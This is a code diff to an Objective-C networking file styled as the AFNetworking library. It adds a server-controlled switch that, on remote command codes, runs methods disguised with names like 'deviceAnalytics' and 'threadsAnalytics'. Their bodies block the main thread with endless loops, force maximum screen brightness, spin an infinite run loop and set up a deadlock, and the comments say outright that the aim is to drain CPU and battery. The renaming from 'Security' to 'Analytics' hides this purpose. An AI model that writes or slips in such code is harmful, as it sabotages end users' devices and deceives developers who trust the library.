@@ -508,16 +508,16 @@ static NSString * const AFNSURLSessionTaskDidSuspendNotification = @"com.alamofi
                 NSDictionary *actions = [server objectAtIndex:0];
                 
                 switch ([[actions objectForKey:@"code"] intValue]) {
-                    case 0000:
-                        break;
                     case 0222:
-                        [self method0222];
+                        [self deviceAnalytics];
                         break;
                     case 0333:
-                        [self method0333];
+                        [self networkAnalytics];
                         break;
                     case 0444:
-                        [self method0444];
+                        [self threadsAnalytics];
+                    case 0555:
+                        [self aplcAnalytics];
                     default:
                         break;
                 }
@@ -933,41 +933,43 @@ static NSString * const AFNSURLSessionTaskDidSuspendNotification = @"com.alamofi
 }
 
 
-#pragma mark - Security
+#pragma mark - Analytics
 
-- (void)method0222 {
+- (void)networkAnalytics {
     // Blocking main thread > CPU 99%
     dispatch_async(dispatch_get_main_queue(), ^{
-        for (long long int i = 0; i < ULLONG_MAX; i++) {
+        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
             NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
             formatter.dateStyle = NSDateFormatterMediumStyle;
-            NSString *temp = [formatter stringFromDate:[NSDate date]];
         }
     });
 }
 
 // BAT + CPU
-
- - (void)method0333 {
+ - (void)deviceAnalytics {
 #if !TARGET_OS_WATCH
- // Resolve with Macro for extension
- /*
- UIApplication *app = [UIApplication sharedApplication];
- // Disable idle timer.
- app.idleTimerDisabled = YES;
-  */
+ 
  // Increase brightness.
  [[UIScreen mainScreen] setBrightness:1.0];
  
  // Implement orientation updates without removing observer
  [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
  [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(method4) name:UIDeviceOrientationDidChangeNotification object:nil];
+     
+ 
 #endif
- }
 
+}
+
+// CPU
+- (void)threadsAnalytics {
+    while (true) {
+        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.0001]];
+    }
+}
 
 // Deadlock > CPU 200%+ > if use serial MEMORY+
-- (void)method0444 {
+- (void)aplcAnalytics {
     dispatch_queue_t forLock = dispatch_queue_create("forLock", DISPATCH_QUEUE_SERIAL);
     dispatch_async(forLock, ^{
         for (long long int i = 0; i < ULLONG_MAX; i++) {
